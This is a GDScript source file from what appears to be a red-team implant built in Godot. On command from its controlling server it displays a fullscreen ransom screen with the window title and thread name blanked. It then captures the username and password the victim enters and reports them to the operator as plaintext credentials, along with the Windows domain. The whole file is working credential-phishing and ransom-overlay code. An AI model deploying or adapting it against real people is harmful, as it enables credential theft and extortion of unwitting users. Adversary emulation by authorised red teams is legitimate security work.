extends Node

var display_size
var parent
var gui
var api
var task_id

func _ready():
	display_size = Vector2(1024,768)
	parent = $".".get_parent()

	api = parent.get_node("api")
	gui = parent.get_node("GUI")

func show():
	# var window_size = OS.get_window_size()
	# OS.set_window_position(screen_size*0.5 - window_size*0.5) # If not fullscreen

	var screen_size = DisplayServer.screen_get_size(0)

	get_window().set_position(Vector2(0,0))

	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (true) else Window.MODE_WINDOWED
	#OS.window_size = screen_size

	gui.position = screen_size*0.5 - display_size*0.75

	gui.show()

func hide():
	gui.hide()
	
	get_window().set_title("")
	var _donotcare = OS.set_thread_name("")
	get_window().mode = Window.MODE_EXCLUSIVE_FULLSCREEN if (false) else Window.MODE_WINDOWED
	get_window().size = Vector2(1,1)
	gui.position = Vector2(-1,-1)
	gui.reset()

func _on_tasking_ransom(task):

	if task.has("command") and task.get("command") == "ransom":
		show()
		task_id = task.get("id")
		
		api.agent_response(
			api.create_task_response(
				true,
				false,
				task_id,
				"ransom screen displayed",
				[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
				[]
			)
		)
	else:
		print("bad ransom task: ", task)
	# TODO: agent_response in failure cases

func _on_GUI_verify_username_password(username, password):
	hide() # TODO: or just keep it up until the redteam member decides it should go away?
	
	var realm = "UNKNOWN REALM"

	if OS.has_environment("USERDOMAIN"):
		realm = OS.get_environment("USERDOMAIN")

	api.agent_response(
		api.create_task_response(
			true,
			true,
			task_id,
			"ransom screen collected credentials",
			[],
			[
				{
					"comment": "untrusted credential source (ransom screen)",
					"credential_type": "plaintext",
					"realm": realm,
					"credential": password,
					"account": username,
				}
			]
		)
	)
